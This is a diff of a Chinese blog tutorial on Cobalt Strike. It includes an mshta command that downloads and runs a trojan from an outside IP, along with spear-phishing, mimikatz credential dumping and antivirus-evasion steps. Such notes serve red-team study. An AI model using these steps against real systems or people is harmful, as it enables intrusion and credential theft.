@@ -6,7 +6,7 @@
 <meta property="og:description" content="Cobalt strike的安装与使用Cobalt Strike 要求 Oracle Java 1.8，Oracle Java 11, 或 OpenJDK 11 安装Windows客户端的安装 安装windows10虚拟机(防止中毒，也可直接安装在本机，方便很多)  ：配java环境 安装cs服务端  管理员身份运行powshell: 123.&#x2F;Keytool.exe -keystore .&#x2F;co">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-01-16T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-02-25T13:54:24.437Z">
+<meta property="article:modified_time" content="2023-02-25T14:03:13.929Z">
 <meta property="article:author" content="micgo">
 <meta property="article:tag" content="CS">
 <meta name="twitter:card" content="summary"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://micgo520.github.io/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Cobalt%20Strike%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
@@ -51,7 +51,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2023-02-25 21:54:24'
+  postUpdate: '2023-02-25 22:03:13'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -140,13 +140,13 @@
       }
     }
     detectApple()
-    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">micgo's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Cobalt Strike学习笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-16T16:00:00.000Z" title="发表于 2023-01-17 00:00:00">2023-01-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-25T13:54:24.437Z" title="更新于 2023-02-25 21:54:24">2023-02-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Cobalt Strike学习笔记"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h4 id="Cobalt-strike的安装与使用"><a href="#Cobalt-strike的安装与使用" class="headerlink" title="Cobalt strike的安装与使用"></a><strong>Cobalt strike的安装与使用</strong></h4><p>Cobalt Strike 要求 Oracle Java 1.8，Oracle Java 11, 或 OpenJDK 11</p>
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">micgo's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Cobalt Strike学习笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-16T16:00:00.000Z" title="发表于 2023-01-17 00:00:00">2023-01-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-25T14:03:13.929Z" title="更新于 2023-02-25 22:03:13">2023-02-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Cobalt Strike学习笔记"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h4 id="Cobalt-strike的安装与使用"><a href="#Cobalt-strike的安装与使用" class="headerlink" title="Cobalt strike的安装与使用"></a><strong>Cobalt strike的安装与使用</strong></h4><p>Cobalt Strike 要求 Oracle Java 1.8，Oracle Java 11, 或 OpenJDK 11</p>
 <h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p>Windows客户端的安装</p>
 <p>安装windows10虚拟机(防止中毒，也可直接安装在本机，方便很多)  ：配java环境 安装cs服务端 </p>
 <p>管理员身份运行powshell:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./Keytool.exe -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname &quot;CN=Major Cobalt Strike,OU=AdvancedPenTesting,O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth&quot;</span><br><span class="line"></span><br><span class="line">.\teamserver.bat 192.168.245.2  123456   //先ipconfig看一下本机ip</span><br></pre></td></tr></table></figure>
 
-<img src="https://i0.hdslb.com/bfs/album/b4f9206c0bc610193f31cf091c8f5eb82c5616ac.png" alt="image-20230104160436912" style="zoom: 67%;" />
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/b4f9206c0bc610193f31cf091c8f5eb82c5616ac.png" alt="image-20230104160436912" style="zoom: 67%;" />
 
 
 
@@ -154,9 +154,9 @@
 <p>Cobalt Strike 团队服务器必须在受支持的 Linux 系统上运行，以root身份运行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 755 teamserver    //给服务器端运行权限</span><br><span class="line">./teamserver 45.77.20.229 12345678  //192.168.245.132是服务器的内网地址(linux地址)，123456是设置的密码</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i0.hdslb.com/bfs/album/954e0ff4b530bbb1268535f352168030a45a840f.png" alt="image-20230104161324649"></p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/954e0ff4b530bbb1268535f352168030a45a840f.png" alt="image-20230104161324649"></p>
 <p>都配置完成后就可以回到windows客户端，点击运行bat文件（这里踩了个坑，服务端客户端版本不一致连不上）</p>
-<p><img src="https://i0.hdslb.com/bfs/album/16f10d110a008d658a019bcbf2cba7ed8a0ce2fb.png" alt="image-20230104162009604"></p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/16f10d110a008d658a019bcbf2cba7ed8a0ce2fb.png" alt="image-20230104162009604"></p>
 <p>换成一致的4.0版本后成功连接</p>
 <p><img src="https://i0.hdslb.com/bfs/album/f7da27243126dc12c1b0301041659bd814fcca33.png" alt="image-20230104162535570"></p>
 <p><strong>创建监听器</strong><br>Listner(监听器):专门用于对其他对象身上发生的事件或状态改变进行监听和相应处理的对象,当被监视的对象发生情况时,立即采取相应的行动。</p>
@@ -195,23 +195,23 @@
 <img src="https://img-blog.csdnimg.cn/20200921124843316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xVT0JJS1VO,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" style="zoom:50%;" />
 
 <p>点击生成的木马文件即上线</p>
-<p><img src="https://i0.hdslb.com/bfs/album/a1ed72532b6addefe64765c69a2d2f9b15c98721.png" alt="image-20230104210808106"></p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/a1ed72532b6addefe64765c69a2d2f9b15c98721.png" alt="image-20230104210808106"></p>
 <p>cobalt strike为了维持连接，会每60秒发送一次连接，但是如果使用的话60秒会造成卡顿, 上线后将默认心跳包改成0s，</p>
 <p>修改方法：右键弹出的内容下拉菜单中选择session-&gt;sleep，弹出的对话框中输入0，单击确定</p>
 <p>或直接在beacon命令行里输入sleep 0</p>
 <img src="https://img-blog.csdnimg.cn/20200921125019892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xVT0JJS1VO,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" style="zoom:50%;" />
 
 <p>获取自己需要的信息</p>
-<p><img src="https://i0.hdslb.com/bfs/album/6a09d212341cbf4a7dfbf5c7c395eddbe1de5156.png" alt="image-20230104211146525"></p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/6a09d212341cbf4a7dfbf5c7c395eddbe1de5156.png" alt="image-20230104211146525"></p>
 <h6 id="HTML-Application"><a href="#HTML-Application" class="headerlink" title="HTML Application"></a><strong>HTML Application</strong></h6><p>点击Attacks-&gt;Packages-&gt;HTML Application，选择对应的监听器，方法这里有三种(executable&#x2F;VBA&#x2F;powershell)，选择powershell，点击Generate生成，选择生成的路径及文件名保存即可。</p>
-<img src="https://i0.hdslb.com/bfs/album/06c0ab9a3c7e2811baa12e28df1952d1d7fa184a.png" alt="image-20230105103304653" style="zoom: 50%;" />
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/06c0ab9a3c7e2811baa12e28df1952d1d7fa184a.png" alt="image-20230105103304653" style="zoom: 50%;" />
 
-<p><img src="https://i0.hdslb.com/bfs/album/95dfef4d0f6c4021bc0d97cf9c3bbd250ad8a7e1.png" alt="image-20230105103343948"></p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/95dfef4d0f6c4021bc0d97cf9c3bbd250ad8a7e1.png" alt="image-20230105103343948"></p>
 <p>开启web服务</p>
 <p>点击Attacks-&gt;Web Drive-by-&gt;Host File，选择刚刚生成的木马evil.hta，点击Launch生成下载链接</p>
-<img src="https://i0.hdslb.com/bfs/album/3e5e3700f14cbcda0ad1735cb6f219bf1c9d0118.png" alt="image-20230105103430533" style="zoom: 50%;" />
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/3e5e3700f14cbcda0ad1735cb6f219bf1c9d0118.png" alt="image-20230105103430533" style="zoom: 50%;" />
 
-<img src="https://i0.hdslb.com/bfs/album/36e3a4bed52b03bf14a4cadf1436a07fb904b650.png" alt="image-20230105101708192" style="zoom:40%;" />
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/36e3a4bed52b03bf14a4cadf1436a07fb904b650.png" alt="image-20230105101708192" style="zoom:40%;" />
 
 <p>访问下载木马文件</p>
 <img src="https://i0.hdslb.com/bfs/album/62bb970158c7afbeb154215fd610a8b5d25d15b4.png" alt="image-20230105103536068" style="zoom: 40%;" />
@@ -221,38 +221,38 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http://45.77.20.229/download/file.ext</span><br></pre></td></tr></table></figure>
 
 <p>上线</p>
-<img src="https://i0.hdslb.com/bfs/album/e76b4821300e7aaf16c0c3ae0be523066dd78b03.png" alt="image-20230105102738447" style="zoom: 50%;" />
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/e76b4821300e7aaf16c0c3ae0be523066dd78b03.png" alt="image-20230105102738447" style="zoom: 50%;" />
 
 
 
 
 
 <h6 id="克隆网站"><a href="#克隆网站" class="headerlink" title="克隆网站"></a><strong>克隆网站</strong></h6><p>我的java环境有问题，烦死了,换了个java版本也不行</p>
-<img src="https://i0.hdslb.com/bfs/album/20669b81cb0512606c6a59b3567a06d4b1d93501.png" alt="image-20230106214548145" style="zoom:50%;" />
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20669b81cb0512606c6a59b3567a06d4b1d93501.png" alt="image-20230106214548145" style="zoom:50%;" />
 
 
 
 <p>用户键盘输入的信息都可以在web日志中看到</p>
-<p><img src="https://image.3001.net/images/20211204/1638617920_61ab53406f76617d9f34b.png!small" alt="image-20211201163859793"></p>
-<h6 id="microsoft-宏"><a href="#microsoft-宏" class="headerlink" title="microsoft 宏"></a><strong>microsoft 宏</strong></h6><p><img src="https://p0.ssl.qhimg.com/t01cdc8b3f9eb1ed0a7.png" alt="img"></p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1638617920_61ab53406f76617d9f34b.png!small" alt="image-20211201163859793"></p>
+<h6 id="microsoft-宏"><a href="#microsoft-宏" class="headerlink" title="microsoft 宏"></a><strong>microsoft 宏</strong></h6><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/t01cdc8b3f9eb1ed0a7.png" alt="img"></p>
 <p>不关防火墙保存不了，但可以直接执行，虽然也会检测到，但还是可以上线</p>
-<img src="https://i0.hdslb.com/bfs/album/4123d4671c3865af2a40c927cebc710360040550.png" alt="image-20230106224059530" style="zoom: 33%;" />
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/4123d4671c3865af2a40c927cebc710360040550.png" alt="image-20230106224059530" style="zoom: 33%;" />
 
 <p>将此文档保存为可以执行宏的格式，这里保存的为Doc1.docm</p>
 <p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230109110458850.png" alt="image-20230109110458850"></p>
 <p>在自己电脑上打开此文件，即可在cs中看到自己上线的主机</p>
-<h6 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h6><p><img src="https://i0.hdslb.com/bfs/album/54f99583be0ce4fd1b50728708d8912a40fa26ac.png" alt="image-20230108202436425"></p>
+<h6 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h6><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/54f99583be0ce4fd1b50728708d8912a40fa26ac.png" alt="image-20230108202436425"></p>
 <p>建立一个钓鱼页面去收集用户信息，其中主机地址和端口就是TeamServerIP和端口，RedirectUrl就是点击后跳转的URL，可以填一个大型网站，底下的使用JavaApplet复选框也已经过时对于受害者系统版本较低的情况下可以使用，点击开始后会生成URL，只要诱导用户访问即上线</p>
 <p>用户访问后跳转到百度，在 视图-&gt;应用信息 可以看到收集的信息</p>
-<img src="https://i0.hdslb.com/bfs/album/a2810945d3fa95fa19c30beccb16728c71e10545.png" alt="image-20230108202227397" style="zoom:33%;" />
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/a2810945d3fa95fa19c30beccb16728c71e10545.png" alt="image-20230108202227397" style="zoom:33%;" />
 
-<img src="https://i0.hdslb.com/bfs/album/50327de6b6b413f4b808196ded7701531da24655.png" alt="image-20230108202330601" style="zoom:33%;" />
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/50327de6b6b413f4b808196ded7701531da24655.png" alt="image-20230108202330601" style="zoom:33%;" />
 
 <p>能够看到目标使用的浏览器版本、系统版本等信息了，知道了版本信息，就能够进一步知道目标上可能存在什么漏洞。</p>
 <h6 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a><strong>钓鱼邮件</strong></h6><p>鱼叉式网络钓鱼攻击针对特定组织内的特定目标个体，相对于普通钓鱼攻击来说针对的目标更加精准，所以形象的成为鱼叉钓鱼攻击</p>
 <p>当进行攻击的骇客锁定目标后，会以电子邮件的方式，假冒该公司或组织的名义寄发难以辨真伪之档案，诱使员工进一步登录其账号密码，使攻击者可以以此借机安装特洛伊木马或其他间谍软件，窃取机密；或于员工时常浏览之网页中置入病毒自动下载器，并持续更新受感染系统内之变种病毒，使使用者穷于应付。由于鱼叉式网络钓鱼锁定之对象并非一般个人，而是特定公司、组织之成员，故受窃之资讯已非一般网络钓鱼所窃取之个人资料，而是其他高度敏感性资料，如知识产权及商业机密</p>
 <p>比较常见的鱼叉攻击就是发钓鱼邮件攻击，接下来使用CS来进行演示</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/7991b5b1a8525572be53e7648988d156.png" alt="image-20211202174355081"></p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/7991b5b1a8525572be53e7648988d156.png" alt="image-20211202174355081"></p>
 <p>基本步骤</p>
 <ol>
 <li><p>创建一个目标清单</p>
@@ -278,12 +278,12 @@
 
 <p><strong>3.选择邮件服务器</strong></p>
 <p>我这里直接使用的163的邮箱(手动开启SMTP POP3服务全开)</p>
-<img src="https://img-blog.csdnimg.cn/img_convert/1f4233df0f635ba7c9ef759a3fc84b5d.png" alt="image-20211202195115072" style="zoom: 67%;" />
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1f4233df0f635ba7c9ef759a3fc84b5d.png" alt="image-20211202195115072" style="zoom: 67%;" />
 
 
 
 <p><strong>4.发送邮件</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/0830e6116824d1c69f38cc1126d101f5.png" alt="image-20211202181501438"></p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/0830e6116824d1c69f38cc1126d101f5.png" alt="image-20211202181501438"></p>
 <p>EmbedURL 选择生成的克隆网站链接</p>
 <p>BounceTo，Bounce To为退回邮件接收地址，注意要和配置邮件服务器时填的邮箱一致</p>
 <p>Preview按钮可以查看邮件模块效果</p>
@@ -301,11 +301,11 @@
 <p>可以拓展很多其他用法，比如带上木马附件，跳转链接为恶意链接等……</p>
 <p><strong>凭证和哈希获取</strong></p>
 <p>想要获取凭证信息，可以在管理员权限的会话处右击选择<code>Access --&gt; Dump Hashes</code>，或者在控制台中使用<code>hashdump</code>命令。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/JOHN-FROD/PicGo/blog-img/20220214112236.png" alt="image-20220214112235725"></p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20220214112236.png" alt="image-20220214112235725"></p>
 <p>想获取当前用户的密码，可以运行<code>mimikatz</code>，右击管理员权限会话选择<code>Access --&gt; Run Mimikatz</code>，或在控制台运行<code>logonpasswords</code>命令。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/JOHN-FROD/PicGo/blog-img/20220214112330.png" alt="image-20220214112328803"></p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20220214112330.png" alt="image-20220214112328803"></p>
 <p>在<code>View --&gt; Credentials</code>下可以查看到<code>hashdump</code>与<code>mimikatz</code>获取的数据。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/JOHN-FROD/PicGo/blog-img/20220214112356.png" alt="image-20220214112354732"></p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20220214112356.png" alt="image-20220214112354732"></p>
 <p> </p>
 <h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h5><p>在 Beacon 中集成了 mimikatz ，mimikatz 执行命令有三种形式：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz [module::command] &lt;args&gt; 运行 mimikatz 命令</span><br><span class="line">mimikatz [!module::command] &lt;args&gt;强制提升到 SYSTEM 权限再运行命令，因为一些命令只有在 SYSTEM 身份下才能被运行</span><br><span class="line">mimikatz [@module::command] &lt;args&gt;使用当前 Beacon 的访问令牌运行 mimikatz 命令</span><br></pre></td></tr></table></figure>
@@ -1012,7 +1012,7 @@
 <p>转换&#x2F;存储数据</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">metadata &#123;</span><br><span class="line">    netbios;</span><br><span class="line">    append &quot;-.jpg&quot;;</span><br><span class="line">    uri-append;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs23-1.png" alt="img" style="zoom: 67%;" />
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/cs23-1.png" alt="img" style="zoom: 67%;" />
 
 <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs23-2.png" alt="img" style="zoom:67%;" />
 
@@ -1041,7 +1041,7 @@
 
 <p>这里调用的 havex.profile 配置文件，该配置文件里对 cookie 进行了 base64 编码</p>
 <p>开启 cobalt strike 后，使主机上线，通过 wireshark 抓包可以发现数据包确实符合这些特征。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs24-3.png" alt="img"></p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/cs24-3.png" alt="img"></p>
 <h5 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h5><p>Cobalt Strike 不是什么工作情况都能胜任的工具，因此就需要我们根据不同的情况去做一些辅助工作</p>
 <h6 id="1、DKIM、SPF-和-DMARC"><a href="#1、DKIM、SPF-和-DMARC" class="headerlink" title="1、DKIM、SPF 和 DMARC"></a><strong>1、DKIM、SPF 和 DMARC</strong></h6><p>SPF、DKIM、DMARC 都是邮件用于帮助识别垃圾信息的附加组件，那么作为一个攻击者，在发送钓鱼邮件的时候，就需要使自己的邮件能够满足这些组件的标准，或者发送到未配置这些组件的域</p>
 <p>在理解这些防御标准前，需要先理解如何在因特网上通过 SMTP 发送邮件</p>
@@ -1124,11 +1124,11 @@
 <img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230114165636386.png" alt="image-20230114165636386" style="zoom:50%;" />
 
 <p>实测可以过360 安全卫士、 360 杀毒，但腾讯电脑管家、火绒不行</p>
-<h6 id="白名单绕过Defender查杀"><a href="#白名单绕过Defender查杀" class="headerlink" title="白名单绕过Defender查杀"></a>白名单绕过Defender查杀</h6><img src="https://i0.hdslb.com/bfs/album/779828f3e037c045604e662ad4a52f95f5fb665f.png" alt="image-20230102224037589" style="zoom: 67%;" />
+<h6 id="白名单绕过Defender查杀"><a href="#白名单绕过Defender查杀" class="headerlink" title="白名单绕过Defender查杀"></a>白名单绕过Defender查杀</h6><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/779828f3e037c045604e662ad4a52f95f5fb665f.png" alt="image-20230102224037589" style="zoom: 67%;" />
 
 <p><strong>mkdir %SystemDrive%\PHP5433</strong></p>
 <p>mimikatz 免杀过 360 安全卫士和 360 安全杀毒</p>
-<img src="https://i0.hdslb.com/bfs/album/3161ec6053b2e27555d16ac52c4432dcb7777fff.png" alt="image-20230102224410458" style="zoom:67%;" />
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/3161ec6053b2e27555d16ac52c4432dcb7777fff.png" alt="image-20230102224410458" style="zoom:67%;" />
 
 
 
